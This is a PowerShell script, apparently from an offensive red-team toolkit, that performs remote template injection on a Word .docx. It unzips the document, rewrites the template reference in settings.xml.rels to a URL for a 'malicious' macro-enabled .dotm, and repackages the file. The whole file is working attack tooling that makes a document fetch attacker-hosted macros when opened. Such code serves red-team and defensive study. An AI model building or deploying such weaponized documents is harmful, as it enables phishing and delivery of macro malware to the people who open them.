function Build-TemplateInjection {
#.SYNOPSIS
# TBA
# ARBITRARY VERSION NUMBER:  3.0.0
# AUTHOR:  Tyler McCann (@tylerdotrar)
#
#.DESCRIPTION
# TBA
# 
# Parameters:
#   -Document     -->  Target templated Word Document (.docx) to inject
#   -TemplateURL  -->  URL of the malicious Word Template (.dotm) being hosted
#   -Help         -->  Return Get-Help information
#
#.LINK
# https://github.com/tylerdotrar/PoorMansArmory


    Param(
        [string]$Document,
        [string]$TemplateURL,
        [switch]$Help
    )
    

    # Return Get-Help Information
    if ($Help) { return (Get-Help Template-Inject) }


    # Error Correction
    if (!(Test-Path -LiteralPath $Document)) { return (Write-Host 'Target document does not exist.' -ForegroundColor Red) }
    if ($Document -notlike '*.docx')         { return (Write-Host 'Target document not in the correct format.' -ForegroundColor Red) }
    if (!$TemplateURL)                       { return (Write-Host 'Template URL not input.' -ForegroundColor Red) }
    if ($TemplateURL -notlike 'http*')       { return (Write-Host 'Template URL not in correct format.' -ForegroundColor Red) }
    

    # Establish Variables
    $DocumentPath    = (Get-Item -LiteralPath $Document).FullName
    $Document        = (Get-Item -LiteralPath $DocumentPath).Name

    $ZipArchive      = $DocumentPath.Replace('.docx','.zip')
    $InjectionFolder = $DocumentPath.Replace('.docx','')
    $SettingsFile    = "$InjectionFolder\word\_rels\settings.xml.rels"
    

    Write-Host "[+] Template Injecting Word Document (.docx)..."  -ForegroundColor Yellow
    Write-Host " o  Target Document: '$Document'"

    # Deconstruct the .docx
    Rename-Item -LiteralPath $DocumentPath -NewName $ZipArchive -Force
    Write-Host " o  Converting to '.zip'..."
    Start-Sleep -Milliseconds 1500
    Expand-Archive -LiteralPath $ZipArchive -DestinationPath $InjectionFolder
    Write-Host " o  Expanding archive..."
    Start-Sleep -Milliseconds 1500
    Remove-Item -LiteralPath $ZipArchive -Recurse -Force
    Write-Host " o  Cleaning up..."
    Start-Sleep -Milliseconds 1500


    # Adjust the internal URL
    $SettingsContent = Get-Content -LiteralPath $SettingsFile
    $OriginalTarget  = $SettingsContent.Split(" ")[-2]
    $TemplateTarget  = "Target=`"$TemplateURL`""
    $SettingsContent.Replace($OriginalTarget,$TemplateTarget) | Out-File -LiteralPath $SettingsFile -Encoding utf8
    Write-Host ' o  Injecting template URL...'
    Start-Sleep -Milliseconds 1500


    # Rebuild the .docx
    $FolderContents = (Get-ChildItem -LiteralPath $InjectionFolder).FullName
    Compress-Archive -LiteralPath $FolderContents -DestinationPath $ZipArchive -Force
    Write-Host " o  Compressing archive..."
    Start-Sleep -Milliseconds 1500
    Rename-Item -LiteralPath $ZipArchive -NewName $DocumentPath -Force
    Write-Host " o  Converting to '.docx'..."
    Start-Sleep -Milliseconds 1500
    Remove-Item -LiteralPath $InjectionFolder -Recurse -Force
    Write-Host " o  Cleaning up..."


    return " o  '$Document' successfully injected.`n"
}